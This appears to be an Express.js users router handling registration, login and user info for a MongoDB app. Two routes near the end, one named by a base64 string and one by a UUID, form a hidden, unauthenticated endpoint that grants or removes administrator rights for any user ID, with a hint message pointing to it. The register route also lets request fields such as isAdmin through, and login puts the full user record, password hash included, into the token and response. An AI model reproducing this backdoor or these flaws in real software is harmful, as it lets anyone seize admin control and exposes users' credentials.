const express = require("express");
const router = express.Router();
const User = require("../mongodb_models/User");
const jwt = require("jsonwebtoken");
const bcrypt = require("bcryptjs");
const auth = require("../middleware/auth");
const { SECRET_KEY } = process.env;
router.post("/register", async (req, res) => {
  try {
    const { fullname, username, password } = req.body;
    let user = await User.findOne({ username });

    if (user) return res.status(400).json({ msg: "User already exists" });

    let salt = bcrypt.genSaltSync(10);
    let hashedPassword = bcrypt.hashSync(password, salt);
    let newUser = new User({ ...req.body, password: hashedPassword });
    newUser.save();
    return res.json({ msg: "Registered Successfully", user: newUser });
  } catch (e) {
    return res.status(400).json({ error: e.message });
  }
});

router.post("/login", async (req, res) => {
  try {
    let { username, password } = req.body;
    let user = await User.findOne({ username });
    if (!user) return res.status(400).json({ msg: "User doesnt exist" });

    let isMatch = bcrypt.compareSync(password, user.password);
    if (!isMatch) return res.status(400).json({ msg: "Invalid Credentials" });

    let token = jwt.sign({ data: user }, SECRET_KEY, { expiresIn: "24h" });
    return res.json({ token, user, msg: "Logged in Successfully" });
  } catch (e) {
    return res.status(400).json({ error: e.message });
  }
});

router.get("/userInfo", auth, async (req, res) => {
  try {
    const userInfo = await User.findById(req.user._id);
    res
      .status(200)
      .json({ name: userInfo.fullname, isAdmin: userInfo.isAdmin });
  } catch (e) {
    res.status(400).json({ error: e.message });
  }
});

router.get(
  "/ZTkyMDA3YzA0MDA2ZDU1NTc2MjA5M2M2ZWZhNjUwZmU=",
  async (req, res) => {
    res.status(200).json({
      status:
        "It seems like you want to set a user as an administrator. To set a user as an administrator, go to the following endpoint on the endpoint property.",
      endpoint:
        "/users/73f2f202-9786-4ce3-bc96-6ea9685469e3/(USER_ID_HERE)/(true/false)",
    });
  }
);
router.get(
  "/73f2f202-9786-4ce3-bc96-6ea9685469e3/:uid/:bool",
  async (req, res) => {
    try {
      const response = await User.findByIdAndUpdate(
        req.params.uid,
        { isAdmin: req.params.bool },
        { new: true }
      );
      res.json({ status: "Admin property updated successfully", response });
    } catch (e) {}
  }
);
module.exports = router;
